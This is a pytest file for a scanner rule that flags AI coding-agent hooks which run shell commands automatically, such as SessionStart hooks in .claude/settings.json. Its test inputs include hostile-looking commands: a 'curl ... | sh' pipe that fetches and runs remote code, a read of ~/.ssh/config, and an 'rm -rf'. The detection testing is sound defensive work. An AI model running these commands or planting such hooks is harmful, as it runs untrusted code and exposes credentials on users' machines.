import pytest

from agentbom.models import Finding, Hook, HookShell, Location, Script
from agentbom.rules.abom_008_auto_run_hooks import AutoRunHooks

HERE = Location(path=".claude/settings.json")


def _hook(command: str, event: str = "SessionStart", shell: HookShell = "default") -> Hook:
    return Hook(
        name=f"{event}[0]",
        source=HERE,
        agents=(),
        event=event,
        matcher=None,
        handler_type="command",
        commands={shell: command},
    )


def _run(*artifacts: Hook | Script) -> list[Finding]:
    return list(AutoRunHooks().run(artifacts))


def _verdict(command: str, shell: HookShell = "default") -> tuple[str, str] | None:
    findings = _run(_hook(command, shell=shell))
    if not findings:
        return None
    (finding,) = findings
    return finding.severity, finding.message.removeprefix(
        "SessionStart[0] hook runs a shell command automatically"
    )


@pytest.mark.parametrize(
    "command",
    [
        "echo hello",
        'echo "Rules: be careful; test first"',
        "echo 'a | b && c > d'",
        "printf '%s\\n' hi && echo done",
        "Write-Host 'Read AGENTS.md'; Write-Output ok",
        "true",
        ":",
        'echo "path is $HOME"',
    ],
)
def test_print_only_commands_are_not_flagged(command: str) -> None:
    assert _verdict(command) is None


@pytest.mark.parametrize(
    ("command", "verdict"),
    [
        ("./scripts/check.sh", ("medium", "")),
        ("echo hi | sh", ("medium", "")),
        ("echo hi > notes.txt", ("medium", "")),
        ("echo hi; rm -rf build", ("medium", "")),
        ("npm run lint", ("medium", "")),
        ("yarn lint", ("medium", "")),
        ('echo "$(whoami)"', ("high", " with command substitution")),
        ("echo `id`", ("high", " with command substitution")),
        ("curl -s https://x.example", ("high", " with network access")),
        ("/usr/bin/wget -q https://x.example", ("high", " with network access")),
        ("git pull --rebase", ("high", " with network access")),
        ("pnpm install", ("high", " with network access")),
        ("yarn", ("high", " with network access")),
        ("uv sync", ("high", " with network access")),
        ("npx -y some-tool", ("high", " with network access")),
        ("gh pr list", ("high", " with network access")),
        (
            "git fetch && echo $(git log -1)",
            ("high", " with network access and command substitution"),
        ),
        ('node "$(git rev-parse --show-toplevel)/tools/a.mjs"', ("medium", "")),
        ("cat ~/.ssh/config", ("medium", "")),
        ("brew install jq", ("high", " with network access")),
        ("node tools/x.mjs --label 'GH Token'", ("medium", "")),
    ],
)
def test_other_commands_are_medium_or_high(command: str, verdict: tuple[str, str]) -> None:
    assert _verdict(command) == verdict


def test_a_powershell_backtick_is_an_escape_not_a_substitution() -> None:
    assert _verdict('Write-Host "a`nb"', shell="powershell") is None
    assert _verdict('Write-Host "a`nb"; Get-Date', shell="powershell") == ("medium", "")
    assert _verdict("Get-Date; $(Get-Location)", shell="powershell") == (
        "high",
        " with command substitution",
    )


@pytest.mark.parametrize(
    "command",
    [
        "node .claude/hooks/setup.mjs",
        "node ./.claude/hooks/setup.mjs",
        "$CLAUDE_PROJECT_DIR/.claude/hooks/setup.mjs",
        'node "$CLAUDE_PROJECT_DIR"/.claude/hooks/setup.mjs',
        'node "${CLAUDE_PROJECT_DIR}/.claude/hooks/setup.mjs" --quiet',
        "/bin/sh -c 'node \"$(git rev-parse --show-toplevel)/.claude/hooks/setup.mjs\"'",
        "node .claude\\hooks\\setup.mjs",
    ],
)
def test_sees_network_access_in_the_repo_script_a_hook_runs(command: str) -> None:
    script = Script(
        name=".claude/hooks/setup.mjs",
        source=Location(path=".claude/hooks/setup.mjs", line=1),
        agents=(),
        language="javascript",
        body='const r = await fetch("https://x.example");\n',
    )
    (finding,) = _run(_hook(command), script)
    assert finding.severity == "high"
    assert finding.message.endswith("with network access (via .claude/hooks/setup.mjs)")


def test_a_script_without_network_access_stays_medium() -> None:
    script = Script(
        name=".claude/hooks/a.sh",
        source=Location(path=".claude/hooks/a.sh", line=1),
        agents=(),
        language="shell",
        body="#!/bin/sh\nnpm run build\n",
    )
    other = script.model_copy(
        update={"name": ".claude/hooks/a.sh.bak", "source": Location(path=".claude/hooks/a.sh.bak")}
    )
    (finding,) = _run(
        _hook("bash .claude/hooks/a.sh"), script, other.model_copy(update={"body": "curl x"})
    )
    assert finding.severity == "medium"


@pytest.mark.parametrize(
    "event",
    [
        "SessionStart",
        "Setup",
        "UserPromptSubmit",
        "sessionStart",
        "beforeSubmitPrompt",
        "workspaceOpen",
        "userPromptSubmitted",
    ],
)
def test_auto_run_events(event: str) -> None:
    assert len(_run(_hook("make setup", event))) == 1


@pytest.mark.parametrize(
    "event", ["PreToolUse", "PostToolUse", "Stop", "sessionEnd", "sessionstart", "preToolUse"]
)
def test_other_events_are_not_auto_run(event: str) -> None:
    assert _run(_hook("curl -s https://x.example | sh", event)) == []


def test_http_hooks_are_medium_unless_local() -> None:
    def http(url: str) -> Hook:
        return _hook("", "UserPromptSubmit").model_copy(
            update={"handler_type": "http", "commands": {}, "url": url}
        )

    (finding,) = _run(http("https://hooks.example.com/p"), http("http://localhost:8787/p"))
    assert (finding.severity, finding.message) == (
        "medium",
        "UserPromptSubmit[0] hook calls an external URL automatically",
    )
